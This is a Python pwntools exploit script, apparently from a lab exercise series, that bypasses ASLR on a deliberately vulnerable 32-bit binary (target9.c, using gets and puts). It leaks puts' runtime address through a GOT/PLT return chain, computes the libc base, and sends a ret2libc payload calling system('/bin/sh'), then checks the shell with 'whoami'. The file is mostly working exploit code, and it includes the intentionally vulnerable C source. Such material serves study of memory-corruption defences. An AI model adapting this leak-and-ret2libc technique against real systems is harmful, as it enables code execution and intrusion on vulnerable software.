"""
ASLR Bypass — Two Stage Exploit (Experimental)
================================================
This module attempts to bypass ASLR using an info leak primitive.

Concept based on: Avgerinos et al., AEG NDSS 2011

Stage 1: Leak a runtime libc address via puts() GOT entry
Stage 2: Calculate real addresses and exploit

Status: Experimental — requires a binary with both:
  - A buffer overflow vulnerability
  - An info leak primitive (puts/printf that echoes input back)

Target: target9.c (special target with leak primitive)

Compile target9:
  gcc -m32 -fno-stack-protector -o target9 target9.c
  (ASLR stays ON for this one — do NOT disable it)
"""

import struct
import subprocess
from pwn import process, p32, u32, context, ELF

context.log_level = 'error'
context.arch      = 'i386'

# ─────────────────────────────────────────────
# target9.c — binary with leak + overflow
# ─────────────────────────────────────────────
# #include <stdio.h>
# #include <string.h>
#
# void vulnerable() {
#     char buffer[64];
#     gets(buffer);
#     puts(buffer);   // ← info leak primitive
# }
#
# int main() {
#     setvbuf(stdout, NULL, _IONBF, 0);  // disable buffering
#     vulnerable();
#     return 0;
# }

BINARY  = './target9'
OFFSET  = 76   # same as other targets


def get_got_plt_addresses(binary_path):
    """
    Find GOT entry of puts() and PLT address of puts().
    We'll call puts(GOT[puts]) to leak the real runtime address of puts.
    """
    elf = ELF(binary_path, checksec=False)

    puts_plt = elf.plt.get('puts')
    puts_got = elf.got.get('puts')
    main_addr = elf.symbols.get('main') or elf.symbols.get('vulnerable')

    print(f"[*] puts@plt : {hex(puts_plt)  if puts_plt  else 'NOT FOUND'}")
    print(f"[*] puts@got : {hex(puts_got)  if puts_got  else 'NOT FOUND'}")
    print(f"[*] main     : {hex(main_addr) if main_addr else 'NOT FOUND'}")

    return puts_plt, puts_got, main_addr


def stage1_leak(puts_plt, puts_got, main_addr):
    """
    Stage 1: Call puts(GOT[puts]) to leak runtime address of puts.
    Then return to main() so we can exploit again in Stage 2.

    Payload layout:
    [padding] [puts@plt] [main] [puts@got]
    When vulnerable() returns:
      → jumps to puts()
      → puts() prints 4 bytes at GOT[puts] = real address of puts in libc
      → then returns to main() for Stage 2
    """
    print(f"\n[*] Stage 1 — leaking libc address via puts(GOT[puts])...")

    payload  = b'A' * OFFSET
    payload += p32(puts_plt)   # return to puts()
    payload += p32(main_addr)  # puts() returns here (back to main for stage 2)
    payload += p32(puts_got)   # argument to puts() = GOT entry of puts

    return payload


def calculate_libc_base(leaked_puts_addr, libc_path='/lib32/libc.so.6'):
    """
    Calculate libc base from leaked puts() address.
    libc_base = leaked_puts - puts_offset_in_libc
    """
    try:
        libc = ELF(libc_path, checksec=False)
        puts_offset = libc.symbols['puts']
        libc_base   = leaked_puts_addr - puts_offset

        print(f"[+] Leaked puts() address : {hex(leaked_puts_addr)}")
        print(f"[+] puts() offset in libc : {hex(puts_offset)}")
        print(f"[+] Calculated libc base  : {hex(libc_base)}")

        return libc_base, libc
    except Exception as e:
        print(f"[-] Failed to calculate libc base: {e}")
        return None, None


def stage2_exploit(libc_base, libc):
    """
    Stage 2: Now we know real libc base.
    Calculate real addresses of system() and /bin/sh.
    Build ret2libc payload with correct runtime addresses.
    """
    print(f"\n[*] Stage 2 — building exploit with real addresses...")

    system_addr = libc_base + libc.symbols['system']
    binsh_addr  = libc_base + next(libc.search(b'/bin/sh\x00'))

    print(f"[+] Real system() : {hex(system_addr)}")
    print(f"[+] Real /bin/sh  : {hex(binsh_addr)}")

    payload  = b'A' * OFFSET
    payload += p32(system_addr)
    payload += b'BBBB'
    payload += p32(binsh_addr)

    return payload


def run_aslr_bypass(binary_path=BINARY):
    """
    Full two-stage ASLR bypass:
    Stage 1 → leak libc address → calculate base
    Stage 2 → exploit with real addresses → shell
    """
    print(f"[*] ASLR Bypass — Two Stage Exploit")
    print(f"[*] Target: {binary_path}")
    print(f"[*] NOTE: ASLR must be ENABLED for this to be meaningful")
    print()

    # Get addresses from binary
    puts_plt, puts_got, main_addr = get_got_plt_addresses(binary_path)

    if not all([puts_plt, puts_got, main_addr]):
        print("[-] Could not find required addresses in binary")
        print("[-] Make sure target9 is compiled with puts() and main()")
        return

    # Stage 1 — leak
    stage1_payload = stage1_leak(puts_plt, puts_got, main_addr)

    try:
        p = process(binary_path)

        # Send stage 1 payload
        p.sendline(stage1_payload)

        # Read leaked address
        # puts() prints the 4 bytes at GOT[puts] followed by newline
        leak = p.recv(4)
        leaked_puts = u32(leak)
        print(f"[+] Raw leak received: {leak.hex()}")
        print(f"[+] Leaked puts() address: {hex(leaked_puts)}")

        # Sanity check — libc addresses start with 0xf7 on 32-bit
        if not (0xf7000000 <= leaked_puts <= 0xf8000000):
            print(f"[-] Leaked address looks wrong: {hex(leaked_puts)}")
            print(f"[-] Expected something in range 0xf7000000-0xf8000000")
            p.close()
            return

        # Calculate libc base
        libc_base, libc = calculate_libc_base(leaked_puts)
        if libc_base is None:
            p.close()
            return

        # Stage 2 — exploit with real addresses
        stage2_payload = stage2_exploit(libc_base, libc)

        # Send stage 2 payload (we're back at main() now)
        p.sendline(stage2_payload)

        # Verify shell
        import time
        time.sleep(0.5)
        p.sendline(b'whoami')

        try:
            output = p.recvline(timeout=3).strip().decode(errors='ignore')
            if output:
                print(f"\n[+] ===== ASLR BYPASS SUCCESS =====")
                print(f"[+] Shell spawned as: {output}")
            else:
                print(f"\n[-] No response — Stage 2 failed")
                print(f"[-] Possible reasons:")
                print(f"    - puts() offset wrong for this libc version")
                print(f"    - Stack alignment issue")
                print(f"    - Binary didn't return to main() cleanly")
        except Exception:
            print(f"\n[-] Timeout — exploit failed")

        p.close()

    except Exception as e:
        print(f"[-] Exploit error: {e}")
        print(f"[-] Make sure target9 exists and is compiled correctly")


# ─────────────────────────────────────────────
# Why this is hard
# ─────────────────────────────────────────────

def explain_challenges():
    print("""
ASLR Bypass — Known Challenges
================================

1. Info leak primitive required
   Our existing targets (1-8) don't print anything back.
   We need puts()/printf() that echoes our input.

2. Two stage coordination
   Stage 1 must cleanly return to main() after leaking.
   Any crash between stages = exploit fails.

3. Libc version dependency  
   The puts() offset varies between libc versions.
   Must match exactly or calculation is wrong.

4. Stack alignment
   64-bit targets need 16-byte stack alignment.
   32-bit is more forgiving but still tricky.

5. Buffering issues
   If stdout is buffered, leaked bytes may not arrive.
   Need setvbuf(stdout, NULL, _IONBF, 0) in target.

Current status: Framework implemented, target9 needed.
""")


if __name__ == '__main__':
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == '--explain':
        explain_challenges()
    else:
        # Check if target9 exists
        import os
        if not os.path.exists(BINARY):
            print(f"[-] {BINARY} not found")
            print(f"[*] Create target9.c with:")
            print(f"""
#include <stdio.h>
#include <string.h>

void vulnerable() {{
    char buffer[64];
    gets(buffer);
    puts(buffer);
}}

int main() {{
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}}
""")
            print(f"[*] Compile: gcc -m32 -fno-stack-protector -o target9 target9.c")
            print(f"[*] Keep ASLR enabled: do NOT run echo 0 > /proc/sys/kernel/randomize_va_space")
        else:
            run_aslr_bypass()
